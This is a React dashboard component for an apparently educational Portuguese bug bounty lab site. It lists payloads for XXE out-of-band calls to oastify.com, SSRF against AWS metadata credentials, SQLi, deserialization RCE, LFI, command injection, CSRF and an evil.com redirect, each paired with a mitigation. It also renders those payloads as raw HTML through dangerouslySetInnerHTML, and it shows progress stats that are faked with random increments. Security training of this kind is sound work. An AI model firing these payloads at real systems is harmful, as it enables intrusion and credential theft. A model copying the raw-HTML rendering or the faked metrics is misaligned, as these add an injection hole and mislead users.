// src/pages/Dashboard.jsx
import { useState, useMemo, useEffect, useRef } from "react";
import { Link, useNavigate } from "react-router-dom";
import { useAuth } from "../context/AuthContext";
import {
  Trophy, AlertTriangle, Clock, BarChart, Shield, Target, Beaker, BookOpen, Zap,
  Search, ChevronDown, ChevronUp, Code, Terminal, Globe, Copy, Check, ExternalLink, Info, AlertCircle
} from "lucide-react";
import styles from "./Dashboard.module.css";
import { getReportCount } from "../components/HackerNotifications"; // ← CONTADOR DE HACKERS

// === 10 VULNERABILIDADES REAIS (base para 50 labs) ===
const VULNERABILITY_DATA = [
  { type: "XXE OOB", severity: "Crítico", source: "api", concept: "Injeção de entidades XML externas para exfiltração via OOB (DNS/HTTP).", poc: `<!ENTITY xxe SYSTEM "http://oastify.com">`, bypass: "&#x9;, CDATA", mitigation: "Desative DTD, use JSON, libxml_disable_entity_loader(true)" },
  { type: "SSRF Avançado", severity: "Crítico", source: "url", concept: "Forçar requisições a serviços internos (AWS Metadata, Redis).", poc: `url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`, bypass: "127.0.0.1.xip.io", mitigation: "Whitelist de domínios, bloqueie RFC 1918" },
  { type: "Template Injection", severity: "Alta", source: "api", concept: "Injeção em Jinja2, Twig, FreeMarker para RCE.", poc: `{{7*7}} → {{config}}`, bypass: "${{7*7}}", mitigation: "Sandbox no template, desabilite eval" },
  { type: "SQLi Time-Based", severity: "Alta", source: "url", concept: "Injeção SQL com delay para extração sem eco.", poc: `' AND SLEEP(5)--`, bypass: "BENCHMARK", mitigation: "Prepared Statements, ORM" },
  { type: "RCE via Deserialization", severity: "Crítico", source: "api", concept: "Exploração de gadgets em Java, PHP, Python.", poc: `ysoserial CommonsCollections6 'id'`, bypass: "pickle", mitigation: "Desabilite unserialize" },
  { type: "IDOR Avançado", severity: "Média", source: "endpoint", concept: "Acesso a recursos de outros usuários.", poc: `/user/100 → /user/101`, bypass: "base64", mitigation: "UUID v4, validação por objeto" },
  { type: "LFI to RCE", severity: "Crítico", source: "url", concept: "Inclusão de arquivos locais para RCE.", poc: `php://filter/convert.base64-encode/resource=index.php`, bypass: "%00", mitigation: "Desabilite allow_url_include" },
  { type: "Open Redirect", severity: "Baixa", source: "url", concept: "Redirecionamento malicioso.", poc: `?next=https://evil.com`, bypass: "//evil.com", mitigation: "Whitelist de domínios" },
  { type: "Command Injection", severity: "Crítico", source: "api", concept: "Execução de comandos do SO.", poc: `; id`, bypass: "$(id)", mitigation: "Whitelist de comandos" },
  { type: "CSRF + JWT", severity: "Alta", source: "api", concept: "Falsificação com JWT mal configurado.", poc: `<img src="https://site.com/transfer?to=attacker&amount=1000">`, bypass: "CORS", mitigation: "SameSite=Lax, CSRF token" }
];

export default function Dashboard() {
  const auth = useAuth();
  const user = auth?.user ?? { username: "Convidado" };
  const navigate = useNavigate();

  useEffect(() => {
    if (!auth?.user) navigate?.("/login", { replace: true });
  }, [auth, navigate]);

  // === ESTATÍSTICAS DINÂMICAS (ATUALIZA A CADA 3s) ===
  const [stats, setStats] = useState({
    labsCompleted: 12,
    vulnsFound: 47,
    totalMinutes: 750, // 12h 30m
    rank: 42,
    lastUpdate: Date.now()
  });

  useEffect(() => {
    const interval = setInterval(() => {
      setStats(prev => {
        const now = Date.now();
        const elapsed = (now - prev.lastUpdate) / 1000; // segundos desde última atualização
        if (elapsed < 2.5) return prev; // evita múltiplas atualizações

        // +1 lab concluído (máx 50)
        const labsCompleted = Math.min(prev.labsCompleted + 1, 50);

        // +1 a 3 vulnerabilidades
        const vulnsFound = prev.vulnsFound + Math.floor(Math.random() * 3) + 1;

        // +2 a 5 minutos
        const totalMinutes = prev.totalMinutes + Math.floor(Math.random() * 4) + 2;

        // Rank sobe ou desce (±1 a 3)
        const rankChange = Math.floor(Math.random() * 7) - 3; // -3 a +3
        const rank = Math.max(1, prev.rank + rankChange);

        return {
          labsCompleted,
          vulnsFound,
          totalMinutes,
          rank,
          lastUpdate: now
        };
      });
    }, 3000); // a cada 3 segundos

    return () => clearInterval(interval);
  }, []);

  // Formata tempo
  const formatTime = (minutes) => {
    const h = Math.floor(minutes / 60);
    const m = minutes % 60;
    return `${h}h ${m.toString().padStart(2, '0')}m`;
  };

  // === 50 TUTORIAIS (5 por vulnerabilidade) ===
  const tutorials = useMemo(() => {
    const labs = [];
    for (let i = 0; i < 50; i++) {
      const vuln = VULNERABILITY_DATA[i % VULNERABILITY_DATA.length];
      const labNumber = i + 1;
      const isOOB = vuln.type.includes("OOB");

      const severityColors = {
        "Crítico": { bg: "#dc2626", text: "#ffffff", light: "#fee2e2" },
        "Alta": { bg: "#f59e0b", text: "#1f2937", light: "#fef3c7" },
        "Média": { bg: "#0ea5e9", text: "#ffffff", light: "#dbeafe" },
        "Baixa": { bg: "#6b7280", text: "#ffffff", light: "#e5e7eb" }
      };
      const color = severityColors[vuln.severity] || severityColors["Baixa"];

      labs.push({
        id: `lab${labNumber}`,
        title: `${vuln.type} Lab #${labNumber}`,
        type: vuln.type.split(" ")[0],
        source: vuln.source,
        severity: vuln.severity,
        color: color.bg,
        icon: i % 3 === 0 ? BookOpen : Zap,
        isOOB,
        payload: isOOB ? `http://${crypto.randomUUID().slice(0,8)}.oastify.com` : vuln.poc,
        url: `https://lab.bugbounty.com/${vuln.type.toLowerCase().replace(/ /g, "-")}/test?id=${labNumber}`,
        endpoint: `/api/v${(i % 3) + 1}/${vuln.type.toLowerCase().replace(/ /g, "-")}`,
        topics: [
          { t: "Conceito Técnico", d: `<strong>${vuln.type}</strong>: ${vuln.concept}<br><br>Fonte: <code>${vuln.source}</code> | Severidade: <strong>${vuln.severity}</strong>` },
          { t: "PoC Completo", d: `<div class="mb-2"><strong>Payload:</strong></div><pre class="bg-dark text-light p-2 rounded small overflow-auto">${vuln.poc}</pre>${isOOB ? "<small class='text-muted'>Aguarde no OOB (oastify.com)</small>" : ""}` },
          { t: "Técnicas de Bypass", d: `<ul class="list-unstyled small"><li>• ${vuln.bypass.split(", ")[0]}</li><li>• ${vuln.bypass.split(", ")[1] || "Encode %XX"}</li></ul>` },
          { t: "Mitigação Recomendada", d: `<div class="alert alert-info small p-2">${vuln.mitigation}</div>` }
        ],
        severityColor: color
      });
    }
    return labs;
  }, []);

  const [openSection, setOpenSection] = useState(null);
  const [query, setQuery] = useState("");
  const [copiedId, setCopiedId] = useState(null);
  const [hackerReports, setHackerReports] = useState(0);

  // Atualiza contador de hackers
  useEffect(() => {
    const interval = setInterval(() => {
      setHackerReports(getReportCount());
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  const copyToClipboard = (text, id) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  const filteredTutorials = useMemo(() => {
    const q = query.toLowerCase().trim();
    if (!q) return tutorials;
    return tutorials.filter(t =>
      t.title.toLowerCase().includes(q) ||
      t.type.toLowerCase().includes(q) ||
      t.source.toLowerCase().includes(q) ||
      t.topics.some(tp => tp.t.toLowerCase().includes(q) || tp.d.toLowerCase().includes(q))
    );
  }, [tutorials, query]);

  return (
    <div className={styles.pageWrapper}>
      <div className={styles.container}>

        {/* HEADER COM MAIS ESPAÇO */}
        <header className="d-flex justify-content-between align-items-start mb-5 flex-wrap">
          <div>
            <h1 className={styles.title}>
              Olá, <span className={styles.username}>{user.username}</span>!
            </h1>
            <p className={styles.subtitle}>Plataforma de Bug Bounty — 50 Labs Reais com PoC</p>
          </div>
          <div className="d-flex align-items-center gap-3">
            <div className={styles.clock}>{new Date().toLocaleString('pt-BR')}</div>
            <Link to="/settings" className="btn btn-outline-secondary btn-sm">Configurações</Link>
          </div>
        </header>

        {/* ESTATÍSTICAS DINÂMICAS */}
        <div className="row g-3 mb-5">
          {[
            { label: "Labs Concluídos", value: `${stats.labsCompleted}/50`, icon: Trophy, color: "#2563eb" },
            { label: "Vulnerabilidades Encontradas", value: stats.vulnsFound.toLocaleString(), icon: AlertTriangle, color: "#dc2626" },
            { label: "Tempo Total de Estudo", value: formatTime(stats.totalMinutes), icon: Clock, color: "#2563eb" },
            { label: "Rank Global", value: `#${stats.rank}`, icon: BarChart, color: "#2563eb" },
            { label: "Relatórios Automáticos", value: hackerReports > 99 ? "99+" : hackerReports, icon: Zap, color: "#16a34a" }
          ].map((s, i) => {
            const Icon = s.icon;
            return (
              <div key={i} className="col-12 col-sm-6 col-lg-3">
                <div className={styles.statCard}>
                  <div className={styles.statIcon} style={{ backgroundColor: s.color + "15", borderColor: s.color + "22" }}>
                    <Icon size={20} color={s.color} />
                  </div>
                  <div>
                    <div className={styles.statValue}>{s.value}</div>
                    <div className={styles.statLabel}>{s.label}</div>
                  </div>
                </div>
              </div>
            );
          })}
        </div>

        {/* TUTORIAIS */}
        <div className="row mb-5">
          <div className="col-12">
            <div className={styles.panel}>
              <div className="d-flex justify-content-between align-items-center mb-4 flex-wrap gap-3">
                <div>
                  <h4 className="mb-0 fw-bold">50 Tutoriais com PoC Real</h4>
                  <small className="text-muted">Expanda para ver payload, bypass, mitigação e lab</small>
                </div>
                <div className="input-group" style={{ maxWidth: 420 }}>
                  <span className="input-group-text bg-white"><Search size={16} /></span>
                  <input
                    className="form-control"
                    placeholder="Buscar por XXE, SSRF, SQLi..."
                    value={query}
                    onChange={e => setQuery(e.target.value)}
                  />
                </div>
              </div>

              <div className="accordion" id="tutorialAccordion">
                {filteredTutorials.map(t => {
                  const opened = openSection === t.id;
                  const Icon = t.icon;
                  const color = t.severityColor;

                  return (
                    <div key={t.id} className="accordion-item mb-3" style={{ border: "none" }}>
                      <h2 className="accordion-header">
                        <button
                          className={`accordion-button ${opened ? "" : "collapsed"} ${styles.accordionBtn}`}
                          onClick={() => setOpenSection(prev => prev === t.id ? null : t.id)}
                          type="button"
                        >
                          <div className="d-flex align-items-center w-100">
                            <div className={styles.sectionIcon} style={{ 
                              borderColor: color.bg + "40", 
                              backgroundColor: color.light 
                            }}>
                              <Icon size={18} color={color.bg} />
                            </div>
                            <div className="ms-3 flex-grow-1">
                              <div className={styles.sectionTitle}>{t.title}</div>
                              <div className={styles.sectionSub}>
                                <span>Severidade: <strong style={{ color: color.bg }}>{t.severity}</strong></span>
                                <span className="mx-2">•</span>
                                <span>Fonte: {t.source.toUpperCase()}</span>
                                {t.isOOB && <span className="ms-2 badge bg-warning text-dark">OOB</span>}
                              </div>
                            </div>
                            <div className="d-flex align-items-center">
                              <small className="text-muted me-3">{t.topics.length} passos</small>
                              {opened ? <ChevronUp size={18} /> : <ChevronDown size={18} />}
                            </div>
                          </div>
                        </button>
                      </h2>

                      <div className={`accordion-collapse collapse ${opened ? "show" : ""}`}>
                        <div className={styles.tutorialBody}>
                          <div className="border rounded p-3 mb-3 bg-light">
                            <div className="d-flex justify-content-between align-items-center mb-2">
                              <strong>Payload de Teste:</strong>
                              <button
                                onClick={() => copyToClipboard(t.payload, t.id)}
                                className="btn btn-sm btn-outline-secondary d-flex align-items-center gap-1"
                              >
                                {copiedId === t.id ? <Check size={14} /> : <Copy size={14} />}
                                {copiedId === t.id ? "Copiado!" : "Copiar"}
                              </button>
                            </div>
                            <code className="d-block p-2 bg-dark text-light rounded small overflow-auto">{t.payload}</code>
                          </div>

                          <div className="row mb-3">
                            <div className="col-md-6">
                              <strong>URL:</strong> <code className="small">{t.url}</code> <ExternalLink size={12} className="ms-1" />
                            </div>
                            <div className="col-md-6">
                              <strong>API:</strong> <code className="small">POST {t.endpoint}</code>
                            </div>
                          </div>

                          <ol className={styles.tutorialList}>
                            {t.topics.map((tp, i) => (
                              <li key={i} className={styles.topicItem}>
                                <div className={styles.topicIndex}>{i + 1}</div>
                                <div className={styles.topicContent}>
                                  <div className={styles.topicTitle}>{tp.t}</div>
                                  <div className={styles.topicDesc} dangerouslySetInnerHTML={{ __html: tp.d }} />
                                </div>
                              </li>
                            ))}
                          </ol>

                          <div className="d-flex justify-content-between align-items-center mt-4">
                            <Link to={`/labs/${t.id}`} className="btn btn-sm btn-primary d-flex align-items-center gap-1">
                              <Terminal size={14} /> Abrir Lab
                            </Link>
                            <small className="text-muted d-flex align-items-center gap-1">
                              <Info size={12} /> Atualizado em {new Date().toLocaleDateString('pt-BR')}
                            </small>
                          </div>
                        </div>
                      </div>
                    </div>
                  );
                })}
                {filteredTutorials.length === 0 && (
                  <div className="p-5 text-center text-muted">
                    <AlertCircle size={32} className="mb-2 opacity-50" />
                    <div>Nenhum lab encontrado para "<strong>{query}</strong>"</div>
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>

        {/* FOOTER */}
        <footer className="text-center text-muted small py-4">
          <Shield size={14} className="me-1" />
          Plataforma educacional. Use apenas em ambientes autorizados.
        </footer>

      </div>
    </div>
  );
}